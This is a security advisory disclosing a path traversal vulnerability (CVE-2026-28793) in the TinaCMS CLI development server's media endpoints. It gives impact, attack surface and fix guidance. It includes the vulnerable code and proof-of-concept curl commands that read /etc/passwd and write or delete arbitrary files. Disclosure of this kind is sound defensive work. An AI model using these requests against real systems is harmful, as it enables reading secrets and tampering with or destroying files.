# [H] TinaCMS Vulnerable to Path Traversal Leading to Arbitrary File Read, Write and Delete

## Summary
Severity: High
Advisory: GHSA-2f24-mg4x-534q
CVE: CVE-2026-28793
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-2f24-mg4x-534q
Type: github-advisory

## Affected
- npm: `@tinacms/cli` — affected >=0 <2.1.8

## Details
## Summary
The TinaCMS CLI development server exposes media endpoints that are vulnerable to path traversal, allowing attackers to read and write arbitrary files on the filesystem outside the intended media directory.

## Details
When running tinacms dev, the CLI starts a local HTTP server (default port 4001) exposing endpoints such as:

- /media/list/*

- /media/upload/*

- /media/*

These endpoints process user-controlled path segments using decodeURI() and path.join() without validating that the resolved path remains within the configured media directory.

### Vulnerable code
```
bb.on('file', async (_name, file, _info) => {
      const fullPath = decodeURI(req.url?.slice('/media/upload/'.length));
      const saveTo = path.join(mediaFolder, ...fullPath.split('/'));
// No validation that saveTo remains within mediaFolder
      await fs.ensureDir(path.dirname(saveTo));
      file.pipe(fs.createWriteStream(saveTo));
    });
```
## PoC
**Arbitrary File Read**
```
curl "http://localhost:4001/media/list/../../../etc/passwd"
```

Result:

<img width="889" height="280" alt="image(1)" src="https://github.com/user-attachments/assets/a878a86a-71db-46ed-abda-3d4ddba692e0" />


**Arbitrary File Write**
```
echo "ATTACKER_CONTROLLED_CONTENT" > /tmp/payload.txt

curl --path-as-is -X POST \
  "http://localhost:4001/media/upload/../../../../../../tmp/pwned.txt" \
  -F "file=@/tmp/payload.txt"
cat /tmp/pwned.txt
```
Result:
<img width="1320" height="84" alt="image(8)" src="https://github.com/user-attachments/assets/8bd5046b-0456-474f-ab96-4e18a421997c" />

**Arbitrary File Delete**
```
echo "delete_me" > /tmp/delete-test.txt
cat /tmp/delete-test.txt # confirms file exists
curl --path-as-is -X DELETE \
"http://localhost:4001/media/../../../../../../tmp/delete-test.txt"
cat /tmp/delete-test.txt # "No such file or directory"
```
<img width="1135" height="105" alt="image" src="https://github.com/user-attachments/assets/64c24b83-0259-4a12-969d-98c8e8cc81ca" />

## Impact

An attacker who can reach the TinaCMS CLI dev server can:

- Read arbitrary files (e.g. /etc/passwd, .env, SSH keys)

- Write arbitrary files anywhere writable by the server process

- Delete or overwrite files, depending on endpoint usage

- Escalate to code execution in realistic development setups by overwriting executable scripts, configuration files, or watched source files

## Attack Surface

The dev server binds to localhost by default, but exploitation is realistic in:

- Cloud IDEs (Codespaces, Gitpod)

- Docker or VM setups with port forwarding

- Misconfigured dev environments binding to 0.0.0.0

- Local malware or malicious dependencies

The server also enables permissive CORS, which may allow browser-based exploitation if the dev server is externally reachable, but CORS is not required for exploitation.

## Recommended Fix

- Resolve paths to absolute form

- Enforce that resolved paths remain within the media root

- Reject .. path segments and absolute paths

- Consider authentication or token protection for dev server endpoints

## References
- https://github.com/tinacms/tinacms/security/advisories/GHSA-2f24-mg4x-534q
- https://nvd.nist.gov/vuln/detail/CVE-2026-28793
- https://github.com/tinacms/tinacms
